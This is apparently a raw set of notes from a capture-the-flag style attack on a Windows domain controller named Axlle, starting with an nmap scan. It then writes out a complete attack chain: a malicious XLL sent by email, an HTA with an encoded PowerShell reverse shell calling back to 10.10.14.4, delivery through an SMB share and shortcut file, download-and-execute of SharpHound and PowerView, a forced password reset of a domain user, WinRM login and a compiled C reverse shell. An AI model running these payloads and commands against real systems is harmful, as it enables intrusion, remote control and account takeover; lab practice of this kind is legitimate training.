@@ -1,0 +1,124 @@
+tarting Nmap 7.93 ( https://nmap.org ) at 2024-06-23 14:18 CEST
+Nmap scan report for 10.10.11.21
+Host is up (0.050s latency).
+Not shown: 65512 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+25/tcp    open  smtp          
+hMailServer smtpd
+| smtp-commands: MAINFRAME, SIZE 20480000, AUTH LOGIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-title: Axlle Development
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-23 12:19:40Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: axlle.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: axlle.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2024-06-23T12:21:08+00:00; +1s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: AXLLE
+|   NetBIOS_Domain_Name: AXLLE
+|   NetBIOS_Computer_Name: MAINFRAME
+|   DNS_Domain_Name: axlle.htb
+|   DNS_Computer_Name: MAINFRAME.axlle.htb
+|   DNS_Tree_Name: axlle.htb
+|   Product_Version: 10.0.20348
+|_  System_Time: 2024-06-23T12:20:29+00:00
+| ssl-cert: Subject: commonName=MAINFRAME.axlle.htb
+| Not valid before: 2024-05-19T11:25:03
+|_Not valid after:  2024-11-18T11:25:03
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        .NET Message Framing
+49664/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+61232/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+61233/tcp open  msrpc         Microsoft Windows RPC
+61236/tcp open  msrpc         Microsoft Windows RPC
+61723/tcp open  msrpc         Microsoft Windows RPC
+62465/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: MAINFRAME; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 1s, deviation: 0s, median: 0s
+| smb2-time: 
+|   date: 2024-06-23T12:20:29
+|_  start_date: N/A
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled and required
+
+
+
+
+
+https://github.com/haile01/perl_spreadsheet_excel_rce_poc
+
+7z x test.xlsx 
+edit xl->styles.xml
+find . -type f | xargs zip ../newfile.xlsx
+
+
+
+https://swisskyrepo.github.io/InternalAllTheThings/redteam/access/office-attacks/#xll-exec
+x86_64-w64-mingw32-gcc xll_poc.c -fPIC -shared -o xll_poc_new.xll -luser32
+
+swaks --to accounts@axlle.htb --from root@test.htb --body "Shell" --header "Subject: Help me Breach the System" --attach shell.xll
+
+
+
+C:\Program Files (x86)\hMailServer\PHPWebAdmin\config-dist.php
+
+net use z: \\10.10.14.4\files /user:kali mypass
+
+
+<html>
+<head>
+<HTA:APPLICATION ID="HelloExample">
+<script language="jscript">
+        var c = "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANAAiACwANQA1ADUANQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="; 
+        new ActiveXObject('WScript.Shell').Run(c);
+</script>
+</head>
+<body>
+<script>self.close();</script>
+</body>
+</html>
+
+impacket-smbserver -smb2support share .
+
+cd C:\inetpub\testing\
+$url = "file://10.10.14.4/share/shell.hta"
+$shortcutPath = "C:\inetpub\testing\shell.url"
+$shortcutContent = "[InternetShortcut]`r`nURL=$url"
+Set-Content -Path $shortcutPath -Value $shortcutContent
+
+iwr -uri http://10.10.14.4/SharpHound.exe -outfile sharphound.exe
+./SharpHound.exe --CollectionMethods All
+
+(New-Object System.Net.WebClient).DownloadString('http://10.10.14.4/PowerView.ps1') | IEX
+$pass = ConvertTo-SecureString 'SuperSecuredPassword123!' -AsPlainText -Force
+Set-DomainUserPassword -Identity Jacob.Greeny -AccountPassword $pass
+
+evil-winrm -i 10.10.11.21 -u Jacob.Greeny -p "SuperSecuredPassword123\!"
+
+https://github.com/izenynn/c-reverse-shell
+i686-w64-mingw32-gcc-win32 -std=c99 standaloneruner3.c -o standaloneruner3.exe -lws2_32
+
+iwr -uri http://10.10.14.4/standaloneruner3.exe -outfile standalonerunner.exe
+
+
+
+
+
